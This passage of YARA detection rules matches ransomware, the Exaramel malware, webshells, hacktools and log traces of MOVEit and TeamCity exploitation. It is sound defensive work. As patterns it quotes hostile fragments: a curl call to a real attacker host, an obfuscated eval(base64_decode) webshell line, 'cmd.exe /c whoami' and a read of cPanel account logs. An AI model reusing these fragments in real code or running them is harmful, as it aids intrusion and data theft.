		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/mal_lockbit_lnx_macos_apr23.yar#L69-L84"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "d5f96e601150209382d3f6458863bc79768beb99b587aa8d9ba37cb2c11ef634"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = " is encrypted. Checksum after encryption "
		$s2 = "~~~~~Hardware~~~~"
		$s3 = "[+] Add directory to encrypt:"
		$s4 = "][+] Launch parameters: "

	condition:
		2 of them
}

rule SIGNATURE_BASE_LOG_EXPL_Moveit_Exploitation_Indicator_Jun23_1_1
{
	meta:
		description = "Detects a potential compromise indicator found in MOVEit Transfer logs"
		author = "Florian Roth"
		id = "a7c521b8-c654-51dd-9d5b-4ba883feffe3"
		date = "2023-06-01"
		modified = "2023-12-05"
		reference = "https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/vuln_moveit_0day_jun23.yar#L43-L56"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "26674d8dea5cb2e95e442c4c75d80ca610f7373f0b216c0b1c83a5b1f9f70316"
		score = 70
		quality = 85
		tags = ""

	strings:
		$x1 = "POST /moveitisapi/moveitisapi.dll action=m2 " ascii
		$x2 = " GET /human2.aspx - 443 " ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_LOG_EXPL_Moveit_Exploitation_Indicator_Jun23_2_1
{
	meta:
		description = "Detects a potential compromise indicator found in MOVEit Transfer logs"
		author = "Florian Roth"
		id = "1527f5e3-071d-5152-9452-9c4472d258f2"
		date = "2023-06-03"
		modified = "2023-12-05"
		reference = "https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/vuln_moveit_0day_jun23.yar#L58-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "56328d078801a702ad47f01f356df6f00be8da593d03c549e77312af9b47b5be"
		score = 70
		quality = 85
		tags = ""

	strings:
		$a1 = "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.5195.102+Safari/537.36" ascii
		$a2 = "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.5195.54+Safari/537.36" ascii
		$s1 = " POST /moveitisapi/moveitisapi.dll" ascii
		$s2 = " POST /guestaccess.aspx"
		$s3 = " POST /api/v1/folders/"
		$s4 = "/files uploadType=resumable&"
		$s5 = " action=m2 "

	condition:
		1 of ( $a* ) and 3 of ( $s* ) or all of ( $s* )
}

rule SIGNATURE_BASE_LOG_EXPL_Moveit_Exploitation_Indicator_Jun23_3_1
{
	meta:
		description = "Detects a potential compromise indicator found in MOVEit DMZ Web API logs"
		author = "Nasreddine Bencherchali"
		id = "113a501f-d9ed-51fd-82cd-ccb6f02833bd"
		date = "2023-06-13"
		modified = "2023-12-05"
		reference = "https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362/rapid7-analysis"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/vuln_moveit_0day_jun23.yar#L81-L94"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2eaa06c31687c6368f036a705fdc1b1c42355f19c098ae764a998039cc4aebb5"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "TargetInvocationException" ascii
		$s2 = "MOVEit.DMZ.Application.Folders.ResumableUploadFilePartHandler.DeserializeFileUploadStream" ascii

	condition:
		all of ( $s* )
}

rule SIGNATURE_BASE_WEBSHELL_PAS_Webshell_Ziparchivefile_1
{
	meta:
		description = "Detects an archive file created by P.A.S. for download operation"
		author = "FR/ANSSI/SDO (modified by Florian Roth)"
		id = "081cc65b-e51c-59fc-a518-cd986e8ee2f7"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L30-L42"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "c15e7022f45ec211ba635d6cd31bab16f4fb0d3038fb19d5765e0f751c14a826"
		score = 80
		quality = 85
		tags = ""

	strings:
		$s1 = "Archive created by P.A.S. v."

	condition:
		$s1
}

rule SIGNATURE_BASE_WEBSHELL_PAS_Webshell_Sqldumpfile_1
{
	meta:
		description = "Detects SQL dump file created by P.A.S. webshell"
		author = "FR/ANSSI/SDO"
		id = "4c26feeb-3031-5c91-9eeb-4b5fe9702e39"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L64-L76"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "c34abcada22fdf462fd66cc2da18ab9e54215defc6f7a7a95b5a80d1155a2ffe"
		score = 90
		quality = 85
		tags = ""

	strings:
		$ = "-- [ SQL Dump created by P.A.S. ] --"

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Configuration_Key_1
{
	meta:
		description = "Detects the encryption key for the configuration file used by Exaramel malware as seen in sample e1ff72[...]"
		author = "FR/ANSSI/SDO"
		id = "8078de62-3dd2-5ee0-8bda-f508e4013144"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L78-L90"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "056503a2c240a641cd2292a30ab1090e3a358cb4d57dca83b836ecb1bc62ed6b"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "odhyrfjcnfkdtslt"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Configuration_Name_Encrypted_1
{
	meta:
		description = "Detects the specific name of the configuration file in Exaramel malware as seen in sample e1ff72[...]"
		author = "FR/ANSSI/SDO"
		id = "1c06f5fc-3435-51cd-92fb-17a4ab6b63ad"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L92-L104"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "f65d59381403534a2c2f39d66c7c62bf1540eafc9aad1ad73de1809e91c42446"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "configtx.json"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Socket_Path_1
{
	meta:
		description = "Detects path of the unix socket created to prevent concurrent executions in Exaramel malware"
		author = "FR/ANSSI/SDO"
		id = "3aab84c9-9748-5d11-9cd7-efa9151036cf"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L134-L146"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "8c049b5a7b508ca0f160d166f3c726e4a23a2c5b3105d075d7bf7a301a1c58f6"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "/tmp/.applocktx"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Task_Names_1
{
	meta:
		description = "Detects names of the tasks received from the CC server in Exaramel malware"
		author = "FR/ANSSI/SDO"
		id = "185f2f3b-bf5c-54af-bca2-400d08bf9c91"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L148-L167"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "193482da1e2b9509fa9c65d46edc56057f7b5d44b7408d918d4a9cbb60736dab"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "App.Delete"
		$ = "App.SetServer"
		$ = "App.SetProxy"
		$ = "App.SetTimeout"
		$ = "App.Update"
		$ = "IO.ReadFile"
		$ = "IO.WriteFile"
		$ = "OS.ShellExecute"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Strings_Typo_1
{
	meta:
		description = "Detects misc strings in Exaramel malware with typos"
		author = "FR/ANSSI/SDO"
		id = "fdc79b87-eb9e-5751-9474-ff653b073165"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L187-L202"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "65e6de743eb9fc742674c7e54eef8a376963a6fd4380bacd03fe6f92d4235920"
		score = 80
		quality = 85
		tags = ""

	strings:
		$typo1 = "/sbin/init | awk "
		$typo2 = "Syslog service for monitoring \n"
		$typo3 = "Error.Can't update app! Not enough update archive."
		$typo4 = ":\"metod\""

	condition:
		3 of ( $typo* )
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Strings_1
{
	meta:
		description = "Detects Strings used by Exaramel malware"
		author = "FR/ANSSI/SDO (composed from 4 saparate rules by Florian Roth)"
		id = "fdc79b87-eb9e-5751-9474-ff653b073165"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L204-L232"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "9d2790e60184ed973b2735263d0a997f32af0beacc9ea8ef65926fe6507011d5"
		score = 80
		quality = 85
		tags = ""

	strings:
		$persistence1 = "systemd"
		$persistence2 = "upstart"
		$persistence3 = "systemV"
		$persistence4 = "freebsd rc"
		$report1 = "systemdupdate.rep"
		$report2 = "upstartupdate.rep"
		$report3 = "remove.rep"
		$url1 = "/tasks.get/"
		$url2 = "/time.get/"
		$url3 = "/time.set"
		$url4 = "/tasks.report"
		$url5 = "/attachment.get/"
		$url6 = "/auth/app"

	condition:
		(5 of ( $url* ) and all of ( $persistence* ) ) or ( all of ( $persistence* ) and all of ( $report* ) ) or ( 5 of ( $url* ) and all of ( $report* ) )
}

rule SIGNATURE_BASE_LOG_EXPL_SUSP_Teamcity_Oct23_1_1
{
	meta:
		description = "Detects log entries that could indicate a successful exploitation of TeamCity servers"
		author = "Florian Roth"
		id = "4845b40a-cf77-53ae-b2fa-d1ed861153f2"
		date = "2023-10-02"
		modified = "2023-12-05"
		reference = "https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_teamcity_2023_42793.yar#L20-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "a2f0abffb9c72e6b32875310e5af7365b6cab4e6c4f6188daa3085b57c38ed0e"
		score = 70
		quality = 85
		tags = ""

	strings:
		$a1 = "tbrains.buildServer.ACTIVITIES"
		$s1 = "External process is launched by user user with id"
		$s2 = ". Command line: cmd.exe \"/c whoami"

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_FRP_Apr20_1_1
{
	meta:
		description = "Detects FRP fast reverse proxy tool often used by threat groups"
		author = "Florian Roth (Nextron Systems)"
		id = "55483832-0e0b-5c28-8be5-dbd14ddb50e3"
		date = "2020-04-07"
		modified = "2022-11-03"
		reference = "https://github.com/fatedier/frp"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_frp_proxy.yar#L2-L22"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "21f91fd99aed8b62d804504889c41ca77567fd345cf4ea0ef00161eefa9324a7"
		score = 70
		quality = 85
		tags = ""
		hash1 = "05537c1c4e29db76a24320fb7cb80b189860389cdb16a9dbeb0c8d30d9b37006"
		hash2 = "08c685c8febb5385f7548c2a64a27bae7123a937c5af958ebc08a3accb29978d"

	strings:
		$x1 = "frp/vendor/github.com/spf13/" ascii
		$x2 = "github.com/fatedier/frp/vendor/" ascii
		$fpg2 = "<html"
		$fpg3 = "<HTML"
		$fpg6 = "<?xml"

	condition:
		1 of ( $x* ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_HKTL_Powerkatz_Feb19_1_1
{
	meta:
		description = "Detetcs a tool used in the Australian Parliament House network compromise"
		author = "Florian Roth (Nextron Systems)"
		id = "294d6f6c-dbc8-5431-87a0-64abe582c4ea"
		date = "2019-02-18"
		modified = "2023-12-05"
		reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_aus_parl_compromise.yar#L137-L152"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "d1d39d68c5c5a3f6142a966925e2a136e937bc09abddd4080862346683886455"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "Powerkatz32" ascii wide fullword
		$x2 = "Powerkatz64" ascii wide
		$s1 = "GetData: not found taskName" fullword ascii wide
		$s2 = "GetRes Ex:" fullword ascii wide

	condition:
		1 of ( $x* ) and 1 of ( $s* )
}

rule SIGNATURE_BASE_MAL_Github_Repo_Compromise_Myjino_Ru_Aug22_1
{
	meta:
		description = "Detects URL mentioned in report on compromised Github repositories in August 2022"
		author = "Florian Roth (Nextron Systems)"
		id = "1eaabad5-d0de-5d17-a5fa-3c638354843d"
		date = "2022-08-03"
		modified = "2023-12-05"
		reference = "https://twitter.com/stephenlacy/status/1554697077430505473"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_github_repo_compromise_myjino_ru.yar#L2-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "5cbe6ee46a68d89b1e772762e29baa907458235cd014f20a0d0932e95c046f19"
		score = 90
		quality = 85
		tags = ""

	strings:
		$x1 = "curl http://ovz1.j19544519.pr46m.vps.myjino.ru" ascii wide
		$x2 = "http__.Post(\"http://ovz1.j19544519.pr46m.vps.myjino.ru" ascii wide

	condition:
		1 of them
}

rule SIGNATURE_BASE_MAL_JS_Efile_Apr23_1_1
{
	meta:
		description = "Detects JavaScript malware used in eFile compromise"
		author = "Florian Roth"
		id = "ba7a8b2c-789c-5bc5-be53-f2b92c7039e1"
		date = "2023-04-06"
		modified = "2023-12-05"
		reference = "https://twitter.com/Ax_Sharma/status/1643178696084271104/photo/1"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/mal_efile_apr23.yar#L2-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6d94162e5719b92d9df349e7d48cd70e218998b0e120870a435a8073fa49c532"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "let payload_chrome = "
		$s2 = "else if (agent.indexOf(\"firefox"

	condition:
		all of them
}

rule SIGNATURE_BASE_MAL_PHP_Efile_Apr23_1_1
{
	meta:
		description = "Detects malware "
		author = "Florian Roth"
		id = "d663b38e-b082-5cf7-9853-f4685bf3a87b"
		date = "2023-04-06"
		modified = "2023-12-05"
		reference = "https://twitter.com/malwrhunterteam/status/1642988428080865281?s=12&t=C0_T_re0wRP_NfKa27Xw9w"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/mal_efile_apr23.yar#L18-L32"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "ec4ac3f5c19f506a70eacb5fe3173cc06bf20567bbc9a96f3b269910382e5fa2"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff )" ascii
		$s2 = "C:\\\\ProgramData\\\\Browsers" ascii fullword
		$s3 = "curl_https($api_url." ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_KINS_Dropper_1
{
	meta:
		description = "Match protocol, process injects and windows exploit present in KINS dropper"
		author = "AlienVault Labs aortega@alienvault.com"
		id = "17e12685-aaad-5d83-949c-43d5aef1ef0d"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "http://goo.gl/arPhm3"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/crime_kins_dropper.yar#L1-L26"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "cdab93f823e13e0c3104de8e05cb1572f83fb5294f359698092d73fc7983955b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$n1 = "tid=%d&ta=%s-%x" fullword
		$n2 = "fid=%d" fullword
		$n3 = "%[^.].%[^(](%[^)])" fullword
		$i0 = "%s [%s %d] 77 %s"
		$i01 = "Global\\%s%x"
		$i1 = "Inject::InjectProcessByName()"
		$i2 = "Inject::CopyImageToProcess()"
		$i3 = "Inject::InjectProcess()"
		$i4 = "Inject::InjectImageToProcess()"
		$i5 = "Drop::InjectStartThread()"
		$uac1 = "ExploitMS10_092"
		$uac2 = "\\globalroot\\systemroot\\system32\\tasks\\" ascii wide
		$uac3 = "<RunLevel>HighestAvailable</RunLevel>" ascii wide

	condition:
		2 of ( $n* ) and 2 of ( $i* ) and 2 of ( $uac* )
}

rule SIGNATURE_BASE_MAL_Grace_Dec22_1
{
	meta:
		description = "Detects Grace (aka FlawedGrace and GraceWire) RAT"
		author = "X__Junior"
		id = "fc2214dc-f1e5-52d7-a9de-88709a03b04e"
		date = "2022-12-13"
		modified = "2023-12-05"
		reference = "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_sysaid_cve_2023_47246.yar#L40-L59"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "8276662dadfa2f8e07dd7882a60e55bd22ecf1f8f66a09940f16236598646560"
		score = 70
		quality = 85
		tags = ""
		hash1 = "a66df3454b8c13f1b92d8b2cf74f5bfcdedfbff41a5e4add62e15277d14dd169"
		hash2 = "e113a8df3c4845365f924bacf10c00bcc5e17587a204b640852dafca6db20404"

	strings:
		$sa1 = "Grace finalized, no more library calls allowed." ascii
		$sa2 = "Socket forcibly closed due to no response to DISCONNECT signal from other side, worker id(%d)" ascii
		$sa3 = "AVWireCleanupThread" ascii
		$sa4 = "AVTunnelClientDirectIO" ascii
		$sa5 = "AVGraceTunnelWriteThread" ascii
		$sa6 = "AVGraceTunnelClientDirectIO" ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_Perlbot_Pl_1
{
	meta:
		description = "Semi-Auto-generated  - file perlbot.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "378cb0e4-2069-50b7-ab3e-5a81055e9983"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3635-L3646"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7e4deb9884ffffa5d82c22f8dc533a45"
		logic_hash = "784980d620e71fb0cf5aed9ef8bd171a8f50d850bc782645575070b75c42e426"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "my @adms=(\"Kelserific\",\"Puna\",\"nod32\")"
		$s1 = "#Acesso a Shel - 1 ON 0 OFF"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Php_Backdoor_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file php-backdoor.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "aca53071-f793-538d-bbeb-34469cdb4d1f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3647-L3659"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"
		logic_hash = "acab82b40760b45d49da51953f78c69166955de54918634c9bfe394208cdbb56"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "http://michaeldaw.org   2006"
		$s1 = "or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win"
		$s3 = "coded by z0mbie"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Liz0Zim_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e91114ce-18f9-51cd-b41c-b796960ea4fe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3660-L3672"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c6eeacbe779518ea78b8f7ed5f63fc11"
		logic_hash = "a0606dad4474579354709fe6306d15427afc4dec8ad6760a0ee9e91c86c23e4d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<option value=\"cat /var/cpanel/accounting.log\">/var/cpanel/accounting.log</opt"
		$s1 = "Liz0ziM Private Safe Mode Command Execuriton Bypass"
		$s2 = "echo \"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\";" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Nshell__1__Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file Nshell (1).php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44e8b6c5-6f41-5c37-a083-26acedd91956"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3673-L3684"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "973fc89694097a41e684b43a21b1b099"
		logic_hash = "53c7cd24c4eddbded1b4c16fd2758bdf66c0bbe396e487a56d56fc053cf3cc1a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "echo \"Command : <INPUT TYPE=text NAME=cmd value=\".@stripslashes(htmlentities($"
		$s1 = "if(!$whoami)$whoami=exec(\"whoami\"); echo \"whoami :\".$whoami.\"<br>\";" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Shankar_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file shankar.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "0c8ab3eb-574b-5e5a-8117-4efecef94f83"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3685-L3697"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "6eb9db6a3974e511b7951b8f7e7136bb"
		logic_hash = "58b365206c18b8394cf1e03b71b8e47be10bc933bc2c05b7b03b7dad94f6d6b8"
		score = 75
		quality = 85
		tags = ""

	strings:
		$sAuthor = "ShAnKaR"
		$s0 = "<input type=checkbox name='dd' \".(isset($_POST['dd'])?'checked':'').\">DB<input"
		$s3 = "Show<input type=text size=5 value=\".((isset($_POST['br_st']) && isset($_POST['b"

	condition:
		1 of ( $s* ) and $sAuthor
}

rule SIGNATURE_BASE_Casus15_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file Casus15.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ba6748a2-fb80-5eda-816c-155bab9285e5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3698-L3710"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5e2ede2d1c4fa1fcc3cbfe0c005d7b13"
		logic_hash = "6ee7a07163d33ca329d3be2084406629711db14db4605e8413ee963eb0f9d5a7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "copy ( $dosya_gonder2, \"$dir/$dosya_gonder2_name\") ? print(\"$dosya_gonder2_na"
		$s2 = "echo \"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'"
		$s3 = "value='Calistirmak istediginiz "

	condition:
		1 of them
}

rule SIGNATURE_BASE_Small_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file small.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cf4fb88f-a312-560d-be0b-b55bfcb889be"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3711-L3723"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "fcee6226d09d150bfa5f103bee61fbde"
		logic_hash = "e0444aa604e8956d423037b70b9476f5653503055d0f1bc875d43de144ce5c44"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "$pass='abcdef1234567890abcdef1234567890';" fullword
		$s2 = "eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1"
		$s4 = "@ini_set('error_log',NULL);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Shellbot_Pl_1
{
	meta:
		description = "Semi-Auto-generated  - file shellbot.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "07c145b1-c9f7-564a-b354-a6d2072f380c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3724-L3738"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b2a883bc3c03a35cfd020dd2ace4bab8"
		logic_hash = "5db224e4fe8608bb53f044ca6c0361dc66cadd58c6d4ea5ab4f8ae14ebde0e6e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "ShellBOT"
		$s1 = "PacktsGr0up"
		$s2 = "CoRpOrAtIoN"
		$s3 = "# Servidor de irc que vai ser usado "
		$s4 = "/^ctcpflood\\s+(\\d+)\\s+(\\S+)"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Ngh_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file ngh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "2d8ff3c1-d6b3-57ce-8213-232b376dbd05"
		date = "2025-03-29"
		modified = "2025-03-29"
